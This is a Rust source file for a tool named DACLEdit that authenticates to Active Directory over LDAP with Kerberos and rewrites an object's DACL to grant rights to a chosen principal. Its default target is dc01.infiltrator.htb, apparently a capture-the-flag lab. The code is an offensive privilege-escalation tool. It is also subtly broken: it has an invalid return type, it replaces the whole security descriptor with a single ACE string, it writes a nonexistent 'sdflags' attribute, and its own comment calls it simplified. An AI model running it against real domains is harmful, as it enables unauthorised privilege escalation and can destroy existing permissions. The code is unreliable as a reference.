use std::collections::HashSet;
use std::ffi::CString;
use std::os::raw::c_int;
use clap::{builder::NonEmptyStringValueParser, Parser};

mod native;
use native::rust_modify_dacl;

mod sids;
use sids::{AccessMask, RIGHTS_GUID_MAP, SIMPLE_PERMISSIONS_MAP, WELL_KNOWN_SIDS};

use tokio;
#[derive(Parser)]
#[command(name = "DACLEdit")]
#[command(about = "Modify DACL for Active Directory objects", long_about = None)]
struct Cli {
    /// Enable inheritance
    #[arg(long)]
    inheritance: bool,

    /// Principal to set rights for
    #[arg(long)]
    principal: String,

    /// Target Distinguished Name
    #[arg(long = "target-dn")]
    target_dn: String,

    /// LDAP URI
    #[arg(long, default_value = "ldap://dc01.infiltrator.htb")]
    ldap_uri: String,

    /// Kerberos ccache path
    #[arg(long,)]
    ccache_path: Option<String>,

    #[arg(long)]
    rights: String
}
#[tokio::main]
async fn main() -> Result<(), > {
    let cli = Cli::parse();

    if let Some(name) = WELL_KNOWN_SIDS.get(&cli.principal.as_str()) {
        println!("Principal {} is a well-known SID: {}", cli.principal, name);
    }

    //let inheritance_flag = if cli.inheritance { "CI" } else { "" };
    //let rights_string = cli.rights;
    //let new_sd = format!("D:(A;;CC;;;{}){}:{}", cli.principal, inheritance_flag, rights_string);
    let res = dacledit(&cli.ldap_uri, &cli.target_dn, &cli.principal, &cli.rights, cli.inheritance).await;
    match res {
        Ok(_) => Ok(()),
        Err(e) =>{
            println!("Failed {}", e);
            Ok(())
        },
    }
        
}


use ldap3::{Ldap, LdapConn, LdapConnAsync, Mod, Scope, SearchEntry};
use ldap3::result::Result;

async fn dacledit(
    ldap_url: &str,
    target_dn: &str,
    principal: &str,
    rights: &str,
    inheritance: bool
) -> Result<()> {
    let (conn, mut ldap) = LdapConnAsync::new(ldap_url).await?;
    ldap3::drive!(conn);

    // Perform GSSAPI (Kerberos) authentication
    ldap.sasl_gssapi_bind(ldap_url).await?;

    // Modify the DACL
    modify_dacl(&mut ldap, target_dn, principal, rights, inheritance).await?;

    ldap.unbind().await?;
    Ok(())
}

async fn modify_dacl(
    ldap: &mut Ldap,
    target_dn: &str,
    principal: &str,
    rights: &str,
    inheritance: bool
) -> Result<()> {
    // Construct the DACL modification
    let sd_flag = if inheritance { "0" } else { "2147483648" }; // 2147483648 = DACL_PROTECTED

    // Construct the SDDL (Security Descriptor Definition Language) string
    // This is a simplified example and may need adjustment based on your specific needs
    let sddl = format!("(A;CI;{};;;{})", rights, principal);

    println!("Using sddl: {}", sddl);


    let mut sd_flags = HashSet::new();
    sd_flags.insert(sd_flag);

    let mut sddl_set = HashSet::new();
    sddl_set.insert(sddl.as_str());
    // Prepare the modification operation
    let mod_ops = vec![
        Mod::Replace("nTSecurityDescriptor", sddl_set),
        Mod::Replace("sdflags", sd_flags),
    ];

    // Perform the LDAP modify operation
    ldap.modify(target_dn, mod_ops).await?.success()?;

    println!("DACL modified successfully for {}", target_dn);
    Ok(())
}